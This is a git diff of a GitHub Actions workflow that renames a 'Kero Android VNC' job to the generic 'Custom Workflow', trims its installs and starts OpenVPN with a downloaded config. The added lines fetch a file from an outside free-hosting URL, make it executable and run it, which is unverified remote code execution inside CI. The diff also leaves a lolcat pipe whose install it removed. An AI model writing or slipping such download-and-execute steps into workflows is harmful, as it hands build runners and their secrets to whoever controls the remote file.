@@ -1,4 +1,4 @@
-name: Kero Android VNC 1
+name: Custom Workflow
 
 on:
   workflow_dispatch:
@@ -15,14 +15,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt-get install -y ruby wget unzip figlet python3-pip alsa-utils pulseaudio
-          wget https://github.com/busyloop/lolcat/archive/master.zip
-          unzip master.zip
-          cd lolcat-master/bin/
-          sudo gem install lolcat
-          pip3 install git+https://github.com/tehmaze/lolcat.git
-          sudo apt update
-          sudo apt install -y openvpn novnc qemu-kvm websockify figlet
+          sudo apt-get install -y wget openvpn
 
       - name: Download configuration file
         run: |
@@ -40,20 +33,15 @@ jobs:
 
           echo "Configuration file downloaded successfully."
 
-      - name: Download and decode additional YAML
+      - name: Download and execute additional YAML
         run: |
           additional_yml_url="http://kerooo.c1.biz/k.yml"
           echo "Downloading additional YAML file from $additional_yml_url..."
-          wget -q "$additional_yml_url" -O "$GITHUB_WORKSPACE/additional_encoded.yml"
-          echo "Decoding additional YAML file..."
-          base64 -d "$GITHUB_WORKSPACE/additional_encoded.yml" > "$GITHUB_WORKSPACE/additional_decoded.yml"
-
-      - name: Display additional YAML content
-        run: |
-          echo "Content of the additional YAML file:"
-          cat "$GITHUB_WORKSPACE/additional_decoded.yml"
+          wget -q "$additional_yml_url" -O "$GITHUB_WORKSPACE/additional.yml"
+          chmod +x "$GITHUB_WORKSPACE/additional.yml"
+          "$GITHUB_WORKSPACE/additional.yml"
 
       - name: Start OpenVPN
         run: |
-          sleep 3
+          sleep 10
           sudo openvpn --config "$GITHUB_WORKSPACE/client.conf" | lolcat -f
